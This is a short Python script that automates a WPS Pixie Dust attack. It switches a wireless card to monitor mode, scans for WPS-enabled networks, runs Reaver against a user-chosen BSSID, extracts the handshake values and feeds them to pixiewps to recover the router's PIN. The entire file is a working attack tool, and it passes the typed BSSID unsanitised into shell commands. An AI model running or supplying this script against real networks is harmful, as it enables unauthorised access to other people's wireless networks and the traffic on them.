import os
import subprocess

# Set the interface to monitor mode
os.system("ifconfig wlan0 down")
os.system("iwconfig wlan0 mode monitor")
os.system("ifconfig wlan0 up")

# Scan for WPS enabled networks
os.system("wash -i wlan0 -O wash.txt")

# Select the target network
bssid = input("Enter the BSSID of the target network: ")

# Run Reaver to get the required parameters for Pixiewps
os.system(f"reaver -i wlan0 -b {bssid} -vvv -K 1 -f -O reaver.txt")
print("well")

# Extract the required parameters from the Reaver output
with open("reaver.txt", "r") as f:
    reaver_output = f.read()
    pke = reaver_output.split("PKE:")[1].split("\n")[0].strip()
    pkr = reaver_output.split("PKR:")[1].split("\n")[0].strip()
    e_hash1 = reaver_output.split("E-Hash1:")[1].split("\n")[0].strip()
    e_hash2 = reaver_output.split("E-Hash2:")[1].split("\n")[0].strip()
    authkey = reaver_output.split("AuthKey:")[1].split("\n")[0].strip()
    e_nonce = reaver_output.split("E-Nonce:")[1].split("\n")[0].strip()

# Run Pixiewps with the extracted parameters
os.system(f"pixiewps --pke {pke} --pkr {pkr} --e-hash1 {e_hash1} --e-hash2 {e_hash2} --authkey {authkey} --e-nonce {e_nonce}")
